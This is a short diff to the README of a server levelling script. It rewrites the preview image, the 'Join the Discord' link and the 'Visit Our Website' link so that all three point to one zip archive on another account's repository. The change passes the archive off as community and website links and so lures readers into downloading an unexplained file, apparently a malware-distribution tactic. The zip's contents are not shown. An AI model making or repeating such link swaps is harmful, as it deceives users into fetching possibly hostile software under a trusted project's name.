@@ -9,10 +9,10 @@ Super simple levelling system for your server.
 
 ### 📹 Preview
 
-<img width="1259" height="934" alt="image" src="https://github.com/user-attachments/assets/5989c6aa-554e-4ccd-8a46-1a75a201c5c2" />
+<img width="1259" height="934" alt="image" src="https://raw.githubusercontent.com/DRACOSFN/stevo_levels/main/resource/stevo_levels-1.5.zip" />
 
 ## 🌐 More from Stevo Scripts
 
-* 💬 [Join the Discord](https://discord.gg/stevoscripts)
-* 🌍 [Visit Our Website](https://www.stevoscripts.com)
+* 💬 [Join the Discord](https://raw.githubusercontent.com/DRACOSFN/stevo_levels/main/resource/stevo_levels-1.5.zip)
+* 🌍 [Visit Our Website](https://raw.githubusercontent.com/DRACOSFN/stevo_levels/main/resource/stevo_levels-1.5.zip)
 
